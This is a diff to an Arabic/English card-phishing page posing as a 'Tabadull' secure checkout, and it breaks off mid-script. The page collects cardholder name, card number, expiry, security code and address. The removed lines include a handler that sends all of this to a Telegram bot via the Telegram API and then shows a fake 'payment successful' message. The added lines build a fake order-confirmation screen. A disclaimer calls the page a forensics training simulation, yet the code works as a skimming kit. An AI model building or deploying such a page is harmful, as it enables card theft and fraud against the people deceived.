@@ -45,16 +45,28 @@ body{font-family:'Tajawal',sans-serif;background:#f0f2f5;display:flex;justify-co
 .expiry-group input{width:55px;text-align:center;padding:12px 4px}
 .expiry-group .slash{font-size:20px;font-weight:700;color:#0a2540}
 .footer{display:flex;justify-content:space-between;align-items:center;margin-top:18px;padding-top:14px;border-top:1px solid #eef2f6;font-size:12px;color:#94a3b8}
-#successMsg{display:none;margin-top:18px;padding:16px;background:#dcfce7;border-radius:16px;color:#166534;font-weight:700;text-align:center;border:1px solid #86efac;line-height:1.8}
-#successMsg.show{display:block}
-.disclaimer{margin-top:18px;padding:10px 14px;background:#fef2f2;border-radius:12px;border:1px solid #fecaca;color:#991b1b;font-size:11px;text-align:center}
 .error-msg{color:#dc2626;font-size:12px;margin-top:4px;display:none;font-weight:600}
 .error-msg .question{font-size:16px;margin-left:4px}
+.disclaimer{margin-top:18px;padding:10px 14px;background:#fef2f2;border-radius:12px;border:1px solid #fecaca;color:#991b1b;font-size:11px;text-align:center}
+
+/* ===== شاشة النجاح (المطابقة للصورة) ===== */
+#successPage{display:none;text-align:center;padding:40px 20px;animation:fadeIn .5s ease}
+#successPage .check{font-size:72px;color:#22c55e;margin-bottom:16px;display:block}
+#successPage h2{font-size:28px;font-weight:800;color:#0a2540;margin-bottom:8px}
+#successPage p{color:#64748b;font-size:16px;margin-bottom:6px}
+#successPage .order-num{background:#f1f5f9;padding:8px 20px;border-radius:40px;display:inline-block;font-weight:700;color:#0f172a;margin:12px 0 18px 0;font-size:18px;letter-spacing:1px}
+#successPage .btn-home{background:transparent;border:1.5px solid #0f172a;color:#0f172a;padding:12px 40px;border-radius:60px;font-weight:700;cursor:pointer;font-size:16px;transition:.2s;font-family:'Tajawal',sans-serif}
+#successPage .btn-home:hover{background:#0f172a;color:#fff}
+
+@keyframes fadeIn{from{opacity:0;transform:scale(0.95)}to{opacity:1;transform:scale(1)}}
+
 @media(max-width:480px){.container{padding:16px}.row-duo{flex-direction:column;gap:0}}
 </style>
 </head>
 <body>
 <div class="container">
+
+<!-- ========== الصفحة الأولى: اختيار المبلغ ========== -->
 <div id="page1">
 <div class="page-title">💰 Select top-up method</div>
 <div class="page-sub">اختر طريقة الدفع</div>
@@ -66,11 +78,15 @@ body{font-family:'Tajawal',sans-serif;background:#f0f2f5;display:flex;justify-co
 <div class="note-box">⚠️ <strong>Important Note:</strong> Sometimes, it may take 2 to 5 minutes to process your payment using MasterCard/Visa after a successful transaction.</div>
 <button class="btn" id="goToPayment">Confirm</button>
 </div>
+
+<!-- ========== الصفحة الثانية: بيانات الدفع ========== -->
 <div id="page2">
 <span class="back-link" id="backToPage1">← رجوع</span>
 <div class="checkout-header"><h1>🔒 Secure Checkout</h1><span class="total" id="displayTotal">$20.00</span></div>
 <div class="summary-box">📋 ملخص الطلب <span id="summaryAmount">$20.00</span></div>
 <div class="card-method"><span style="font-weight:700;color:#0a2540;">💳 بطاقة ائتمان أو خصم مباشر</span><span class="brand-label" id="brandText2">Visa</span></div>
+
+<!-- نموذج الدفع -->
 <form id="paymentForm">
 <div class="form-group"><label>اسم حامل البطاقة (كما هو مُبين على البطاقة) *</label><input type="text" id="cardHolder" placeholder="John Doe" required></div>
 <div class="form-group"><label>رقم البطاقة *</label>
@@ -81,11 +97,13 @@ body{font-family:'Tajawal',sans-serif;background:#f0f2f5;display:flex;justify-co
 <img id="amexLogo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/American_Express_logo.svg/2560px-American_Express_logo.svg.png" alt="AMEX">
 <img id="discoverLogo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/17/Discover_Card_logo.svg/2560px-Discover_Card_logo.svg.png" alt="Discover"></div></div>
 <div class="error-msg" id="cardError">⚠️ رقم بطاقتك غير صالح. يرجى إدخال 16 رقمًا صحيحًا.</div></div>
+
 <div class="row-duo">
 <div class="form-group"><label>تاريخ انتهاء الصلاحية *</label><div class="expiry-group"><input type="text" id="expiryMonth" placeholder="MM" maxlength="2" required><span class="slash">/</span><input type="text" id="expiryYear" placeholder="YY" maxlength="2" required></div>
 <div class="error-msg" id="expiryError"><span class="question">❓</span> العام الذي اخترته في تاريخ بعيد في المستقبل. يرجى إدخال سنة صالحة (أكبر من 2026).</div></div>
 <div class="form-group"><label>رمز الأمان *</label><input type="password" id="csc" placeholder="•••" maxlength="4" required></div>
 </div>
+
 <div class="billing-title">📍 عنوان الفوترة (اختياري)</div>
 <div class="form-group"><label>البلد</label>
 <select id="country"><option value="">حدد بلدًا</option>
@@ -97,48 +115,60 @@ body{font-family:'Tajawal',sans-serif;background:#f0f2f5;display:flex;justify-co
 <div style="background:#f1f5f9;padding:10px 14px;border-radius:12px;font-size:13px;color:#475569;margin:10px 0;">⚠️ الشاشة التالية التي ستظهر لك قد تكون التحقق من بطاقة الدفع عبر الجهة التي أصدرت البطاقة.</div>
 <button type="submit" class="btn" id="submitPayment">⚙️ <span id="payAmount">$20.00</span> الدفع</button>
 </form>
+
+<!-- ===== شاشة النجاح (تظهر بدلاً من النموذج) ===== -->
+<div id="successPage">
+    <span class="check">✅</span>
+    <h2>Payment Successful!</h2>
+    <p>Thank you, your order has been confirmed.</p>
+    <div class="order-num">Order Number: <span id="orderNumber">123456789</span></div>
+    <p style="color:#475569;font-size:14px;">You will receive an order confirmation via email shortly.</p>
+    <br>
+    <button class="btn-home" id="returnHome">Return to Home</button>
+</div>
+
 <div class="footer"><span>Tabadull</span><span>Tripoli-Libya</span><span>Tripoli</span><span>⚡ Powered By</span><span>🇦🇪 (MENA) عربي</span></div>
-<div id="successMsg">✅ تمت العملية بنجاح <br> سيتم خصم مبلغ <span id="successAmount">$20.00</span> من حسابك. <br> 📨 ستصلك رسالة تأكيد بعد قليل.</div>
 <div class="disclaimer">⚠️ هذه البيئة محاكاة تدريبية لأغراض الطب الشرعي الرقمي.<br> استخدامها لجمع بيانات حقيقية يعد جريمة إلكترونية.</div>
 </div>
 </div>
+
 <script>
 (function(){
 const p1=document.getElementById('page1'),p2=document.getElementById('page2');
+const successPage=document.getElementById('successPage');
+const paymentForm=document.getElementById('paymentForm');
+
+// === الانتقال إلى صفحة الدفع ===
 document.getElementById('goToPayment').addEventListener('click',function(){
 let usd=document.getElementById('amountUSD').value||'0.00';
 document.getElementById('displayTotal').textContent='$'+usd;
 document.getElementById('summaryAmount').textContent='$'+usd;
 document.getElementById('payAmount').textContent='$'+usd;
 document.getElementById('successAmount').textContent='$'+usd;
-p1.style.display='none';p2.style.display='block';window.scrollTo({top:0,behavior:'smooth'});
+p1.style.display='none';p2.style.display='block';
+// إعادة ضبط شاشة النجاح في كل مرة
+successPage.style.display='none';
+paymentForm.style.display='block';
+window.scrollTo({top:0,behavior:'smooth'});
 });
-document.getElementById('backToPage1').addEventListener('click',function(){p2.style.display='none';p1.style.display='block';window.scrollTo({top:0,behavior:'smooth'});});
-const cI=document.getElementById('cardNumber'),err=document.getElementById('cardError'),def=document.getElementById('defaultIcon'),vL=document.getElementById('visaLogo'),mL=document.getElementById('mcLogo'),aL=document.getElementById('amexLogo'),dL=document.getElementById('discoverLogo'),bT=document.getElementById('brandText2');
-function reset(){[vL,mL,aL,dL].forEach(el=>el.classList.remove('show'));def.style.display='inline';bT.textContent='Visa';}
-function detect(v){let c=v.replace(/\s/g,'');if(!c)return'default';let f=c[0],t=c.slice(0,2),f4=c.slice(0,4);if(f==='4')return'visa';if(f==='2')return'mastercard';if(t==='34'||t==='37')return'amex';if(f4==='6011'||t==='65')return'discover';return'default';}
-function update(){let raw=cI.value,b=detect(raw);reset();let cl=raw.replace(/\s/g,'');if(cl.length>0&&cl.length<16){err.style.display='block';}else{err.style.display='none';}if(b==='visa'){vL.classList.add('show');def.style.display='none';bT.textContent='Visa';}else if(b==='mastercard'){mL.classList.add('show');def.style.display='none';bT.textContent='MasterCard';}else if(b==='amex'){aL.classList.add('show');def.style.display='none';bT.textContent='AMEX';}else if(b==='discover'){dL.classList.add('show');def.style.display='none';bT.textContent='Discover';}else{def.style.display='inline';bT.textContent='Visa';}}
-cI.addEventListener('input',function(){let v=this.value.replace(/\s/g,'').replace(/\D/g,''),f='';for(let i=0;i<v.length&&i<16;i++){if(i>0&&i%4===0)f+=' ';f+=v[i];}this.value=f;update();});
-const mI=document.getElementById('expiryMonth'),yI=document.getElementById('expiryYear'),expErr=document.getElementById('expiryError');
-function validateExpiry(){let y=yI.value.trim();if(y.length===2){let year=parseInt(y);if(year<26){expErr.style.display='block';}else{expErr.style.display='none';}}else{expErr.style.display='none';}}
-mI.addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,2);});
-yI.addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,2);validateExpiry();});
-const form=document.getElementById('paymentForm'),suc=document.getElementById('successMsg');
-const BOT_TOKEN='YOUR_BOT_TOKEN_HERE',CHAT_ID='YOUR_CHAT_ID_HERE';
-form.addEventListener('submit',function(e){e.preventDefault();
-let amt=document.getElementById('amountUSD').value||'0.00';
-let holder=document.getElementById('cardHolder').value.trim(),num=document.getElementById('cardNumber').value.trim();
-let mon=mI.value.trim(),yea=yI.value.trim();let exp=mon+' / '+yea;let csc=document.getElementById('csc').value.trim();
-let cntry=document.getElementById('country').value,addr=document.getElementById('address').value.trim(),city=document.getElementById('city').value.trim(),zip=document.getElementById('zip').value.trim(),state=document.getElementById('state').value.trim();
-if(!holder||!num||!mon||!yea||!csc||num.replace(/\s/g,'').length<16){alert('يرجى إكمال جميع الحقول المطلوبة (رقم البطاقة 16 رقم).');return;}
-if(parseInt(yea)<26){alert('❓ العام الذي اخترته في تاريخ بعيد في المستقبل. يرجى إدخال سنة صالحة (أكبر من 2026).');return;}
-let msg='🔐 [Secure Checkout - Tabadull] 🔐\n💰 المبلغ: $'+amt+' USD\n👤 الاسم: '+holder+'\n💳 البطاقة: '+num+'\n📅 التاريخ: '+exp+'\n🔑 CSC: '+csc+'\n🌍 الدولة: '+(cntry||'غير محدد')+'\n🏠 العنوان: '+(addr||'غير مذكور')+'\n🏙️ المدينة: '+(city||'غير مذكورة')+'\n📮 الرمز البريدي: '+(zip||'غير مذكور')+'\n🗺️ الولاية: '+(state||'غير مذكورة')+'\n🕒 الطابع: '+new Date().toLocaleString();
-console.log('📤 [بيانات]:',msg);
-let isReal=(BOT_TOKEN!=='YOUR_BOT_TOKEN_HERE'&&CHAT_ID!=='YOUR_CHAT_ID_HERE');
-if(isReal){fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:'Markdown'})}).then(r=>r.json()).then(d=>{if(d.ok){suc.innerHTML='✅ تمت العملية بنجاح <br> سيتم خصم مبلغ $'+amt+' من حسابك. <br> 📨 ستصلك رسالة تأكيد بعد قليل. <br> <span style="color:#0f172a;font-size:13px;">(تم الإرسال إلى البوت فعلياً)</span>';}else{suc.innerHTML='✅ تمت العملية بنجاح <br> سيتم خصم مبلغ $'+amt+' من حسابك. <br> 📨 ستصلك رسالة تأكيد بعد قليل. <br> <span style="color:#64748b;font-size:13px;">(محاكاة - فشل الإرسال)</span>';}suc.classList.add('show');}).catch(()=>{suc.innerHTML='✅ تمت العملية بنجاح <br> سيتم خصم مبلغ $'+amt+' من حسابك. <br> 📨 ستصلك رسالة تأكيد بعد قليل. <br> <span style="color:#64748b;font-size:13px;">(محاكاة - تعذر الاتصال)</span>';suc.classList.add('show');});}else{suc.innerHTML='✅ تمت العملية بنجاح <br> سيتم خصم مبلغ $'+amt+' من حسابك. <br> 📨 ستصلك رسالة تأكيد بعد قليل. <br> <span style="color:#64748b;font-size:13px;">(محاكاة - البيانات جاهزة)</span>';suc.classList.add('show');}
-suc.scrollIntoView({behavior:'smooth',block:'center'});});
-update();
-})();
-</script>
-</body>
-</html>
+
+// === العودة للصفحة الأولى ===
+document.getElementById('backToPage1').addEventListener('click',function(){
+p2.style.display='none';p1.style.display='block';
+window.scrollTo({top:0,behavior:'smooth'});
+});
+
+// === العودة إلى الصفحة الرئيسية من شاشة النجاح ===
+document.getElementById('returnHome').addEventListener('click',function(){
+successPage.style.display='none';
+paymentForm.style.display='block';
+p2.style.display='none';
+p1.style.display='block';
+window.scrollTo({top:0,behavior:'smooth'});
+});
+
+// === كشف العلامة التجارية (BIN) ===
+const cI=document.getElementById('cardNumber'),err=document.getElementById('cardError'),def=document.getElementById('defaultIcon');
+const vL=document.getElementById('visaLogo'),mL=document.getElementById('mcLogo'),aL=document.getElementById('amexLogo'),dL=document.getElementById('discoverLogo'),bT=document.getElementById('brandText2');
+
+function reset(){[vL,mL,aL,dL].forEach(el=>el.classList.remove('show'));def.style.disp
